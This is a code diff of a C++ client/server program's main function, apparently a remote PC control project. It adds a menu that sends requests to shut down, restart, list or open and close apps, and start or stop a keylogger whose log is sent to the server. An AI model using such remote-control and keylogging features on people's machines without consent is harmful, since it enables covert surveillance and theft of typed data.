@@ -32,44 +32,56 @@ int main(int argc, char* argv[]) {
         }
     } else if (argc == 2 && std::string(argv[1]) == "client") {
         // Start client
-        Client client("192.168.2.253", 54000);
+        Client client("192.168.2.2", 54000);
         if (client.connectToServer()) {
-            std::string command;
-            // // Keylogger
-            // while (true) {
-            //     std::cout << "Enter 'start' to start keylogger, 'stop' to stop keylogger, or 'exit' to quit: ";
-            //     std::cin >> command;
+            int choice;
+            std::cout  << "Input: "; std::cin >> choice;
+            switch(choice){
+                case 1: client.sendShutdownRequest(); break;
+                case 2: client.sendRestartRequest(); break;
+                case 3: client.sendListOfAppRequest(); break;
+                case 4: client.sendListOfServiceRequest(); break;
+                case 5: {
+                    std::string appName;
+                   getline(std::cin, appName);
+                    getline(std::cin, appName);
+                    client.sendOpenAppRequest(appName);
+                }; break;
+                case 6: {
+                    std::string processId;
+                    std::cout << "Input process ID: ";
+                    std::cin.ignore();
+                    getline(std::cin, processId);
+                    client.sendCloseAppRequest(processId);
+                };break;
+                case 7:{
+                    std::string command;
+                    while (true) {
+                        std::cout << "Enter 'start' to start keylogger, 'stop' to stop keylogger, or 'exit' to quit: ";
+                        std::cin >> command;
 
-            //     if (command == "start") {
-            //         client.sendKeyloggerStartRequest();
-            //         std::cout << "Keylogger started." << std::endl;
-            //     } 
-            //     else if (command == "stop") {
-            //         client.sendKeyloggerOffRequest();
-            //         std::cout << "Keylogger stopped and log file sent to server." << std::endl;
-            //     } 
-            //     else if (command == "exit") {
-            //         break;  // Exit the loop and end the client session
-            //     } 
-            //     else {
-            //         std::cout << "Unknown command. Try 'start', 'stop', or 'exit'." << std::endl;
-            //     }
+                        if (command == "start") {
+                            client.sendKeyloggerStartRequest();
+                            std::cout << "Keylogger started." << std::endl;
+                        } 
+                        else if (command == "stop") {
+                            client.sendKeyloggerOffRequest();
+                            std::cout << "Keylogger stopped and log file sent to server." << std::endl;
+                        } 
+                        else if (command == "exit") {
+                            break;  // Exit the loop and end the client session
+                        } 
+                        else {
+                            std::cout << "Unknown command. Try 'start', 'stop', or 'exit'." << std::endl;
+                        }
 
-            //     // Optional delay between commands
-            //     std::this_thread::sleep_for(std::chrono::seconds(1));
-            // }
-            // sendListOfAppRequest();
-            client.sendListOfAppRequest();
+                        // Optional delay between commands
+                        std::this_thread::sleep_for(std::chrono::seconds(1));
+                    }
+                }; break;
+                default: break;
+            }
            
-            // //openApp
-            // client.sendListOfAppRequest();
-            // const std::string& std = "msedge.exe";
-            // client.sendCloseAppRequest(std);
-            //closeApp
-            // const std::string& std = "msedge.exe";
-            // client.sendCloseAppRequest(std);
-            //list services
-            client.sendListOfServiceRequest();
         }
     } else {
         std::cerr << "Usage: " << argv[0] << " [server | client]" << std::endl;
